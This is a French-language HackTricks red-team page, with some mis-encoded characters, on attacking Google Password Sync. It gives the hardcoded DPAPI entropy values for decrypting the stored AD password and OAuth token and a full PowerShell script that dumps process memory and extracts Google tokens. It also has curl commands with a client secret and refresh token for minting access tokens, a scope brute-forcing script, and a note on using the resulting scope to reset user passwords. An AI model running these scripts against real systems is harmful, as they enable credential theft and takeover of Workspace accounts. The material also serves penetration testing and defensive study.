# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Ceci est le binaire et le service que Google propose pour **maintenir synchronis√©s les mots de passe des utilisateurs entre l'AD** et Workspace. Chaque fois qu'un utilisateur change son mot de passe dans l'AD, il est d√©fini sur Google.

Il est install√© dans `C:\Program Files\Google\Password Sync` o√π vous pouvez trouver le binaire `PasswordSync.exe` pour le configurer et `password_sync_service.exe` (le service qui continuera √† fonctionner).

### GPS - Configuration

Pour configurer ce binaire (et service), il est n√©cessaire de **lui donner acc√®s √† un principal Super Admin dans Workspace** :

* Se connecter via **OAuth** avec Google et ensuite il **stockera un jeton dans le registre (chiffr√©)**
* Disponible uniquement sur les contr√¥leurs de domaine avec GUI
* Fournir des **identifiants de compte de service de GCP** (fichier json) avec des permissions pour **g√©rer les utilisateurs de Workspace**
* Tr√®s mauvaise id√©e car ces identifiants n'expirent jamais et pourraient √™tre mal utilis√©s
* Tr√®s mauvaise id√©e de donner un acc√®s SA sur Workspace car le SA pourrait √™tre compromis dans GCP et il serait possible de pivoter vers Workspace
* Google l'exige pour les contr√¥les de domaine sans GUI
* Ces identifiants sont √©galement stock√©s dans le registre

Concernant l'AD, il est possible d'indiquer d'utiliser le **contexte d'applications actuel, anonyme ou des identifiants sp√©cifiques**. Si l'option d'identifiants est s√©lectionn√©e, le **nom d'utilisateur** est stock√© dans un fichier sur le **disque** et le **mot de passe** est **chiffr√©** et stock√© dans le **registre**.

### GPS - Dumping password and token from disk

{% hint style="success" %}
Notez que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) est capable de d√©tecter **GPS**, d'obtenir des informations sur la configuration et **m√™me de d√©chiffrer le mot de passe et le jeton**.
{% endhint %}

Dans le fichier **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`**, il est possible de trouver une partie de la configuration comme le **`baseDN`** de l'AD configur√© et le **`nom d'utilisateur`** dont les identifiants sont utilis√©s.

Dans le registre **`HKLM\Software\Google\Google Apps Password Sync`**, il est possible de trouver le **jeton de rafra√Æchissement chiffr√©** et le **mot de passe chiffr√©** pour l'utilisateur AD (le cas √©ch√©ant). De plus, si au lieu d'un jeton, des **identifiants SA** sont utilis√©s, il est √©galement possible de les trouver chiffr√©s √† cette adresse de registre. Les **valeurs** √† l'int√©rieur de ce registre ne sont accessibles que par les **Administrateurs**.

Le **mot de passe** chiffr√© (le cas √©ch√©ant) se trouve dans la cl√© **`ADPassword`** et est chiffr√© en utilisant l'API **`CryptProtectData`**. Pour le d√©chiffrer, vous devez √™tre le m√™me utilisateur que celui qui a configur√© la synchronisation des mots de passe et utiliser cette **entropie** lors de l'utilisation de **`CryptUnprotectData`** : `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Le jeton chiffr√© (le cas √©ch√©ant) se trouve dans la cl√© **`AuthToken`** et est chiffr√© en utilisant l'API **`CryptProtectData`**. Pour le d√©chiffrer, vous devez √™tre le m√™me utilisateur que celui qui a configur√© la synchronisation des mots de passe et utiliser cette **entropie** lors de l'utilisation de **`CryptUnprotectData`** : `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
De plus, il est √©galement encod√© en base32hex avec le dictionnaire **`0123456789abcdefghijklmnopqrstv`**.

Les valeurs d'entropie ont √©t√© trouv√©es en utilisant l'outil. Il a √©t√© configur√© pour surveiller les appels √† **`CryptUnprotectData`** et **`CryptProtectData`** et ensuite l'outil a √©t√© utilis√© pour lancer et surveiller `PasswordSync.exe` qui d√©chiffrera le mot de passe et le jeton d'authentification configur√©s au d√©but et l'outil affichera **les valeurs pour l'entropie utilis√©e** dans les deux cas :

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Notez qu'il est √©galement possible de voir les valeurs **d√©chiffr√©es** dans l'entr√©e ou la sortie des appels √† ces API √©galement (au cas o√π √† un moment donn√© Winpeas cesserait de fonctionner).

Dans le cas o√π la synchronisation des mots de passe a √©t√© **configur√©e avec des identifiants SA**, elle sera √©galement stock√©e dans des cl√©s √† l'int√©rieur du registre **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Dumping tokens from memory

Tout comme avec GCPW, il est possible de dumper la m√©moire du processus de `PasswordSync.exe` et des processus `password_sync_service.exe` et vous pourrez trouver des jetons de rafra√Æchissement et d'acc√®s (s'ils ont d√©j√† √©t√© g√©n√©r√©s).\
Je suppose que vous pourriez √©galement trouver les identifiants configur√©s de l'AD.

<details>

<summary>Dump <code>PasswordSync.exe</code> and the <code>password_sync_service.exe</code> processes and search tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - G√©n√©ration de jetons d'acc√®s √† partir de jetons d'actualisation

En utilisant le jeton d'actualisation, il est possible de g√©n√©rer des jetons d'acc√®s en utilisant celui-ci ainsi que l'ID client et le secret client sp√©cifi√©s dans la commande suivante :
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Notez qu'il n'est pas possible de demander n'importe quel scope pour le jeton d'acc√®s, m√™me en ayant un jeton de rafra√Æchissement, car vous ne pouvez demander que les **scopes pris en charge par l'application o√π vous g√©n√©rez le jeton d'acc√®s**.

De plus, le jeton de rafra√Æchissement n'est pas valide dans toutes les applications.
{% endhint %}

Par d√©faut, GPS n'aura pas acc√®s en tant qu'utilisateur √† tous les scopes OAuth possibles, donc en utilisant le script suivant, nous pouvons trouver les scopes qui peuvent √™tre utilis√©s avec le `refresh_token` pour g√©n√©rer un `access_token` :

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Et voici le r√©sultat que j'ai obtenu au moment de l'√©criture :
```
https://www.googleapis.com/auth/admin.directory.user
```
Ce qui est le m√™me que celui que vous obtenez si vous n'indiquez aucun champ.

{% hint style="danger" %}
Avec ce champ, vous pourriez **modifier le mot de passe d'un utilisateur existant pour √©lever les privil√®ges**.
{% endhint %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
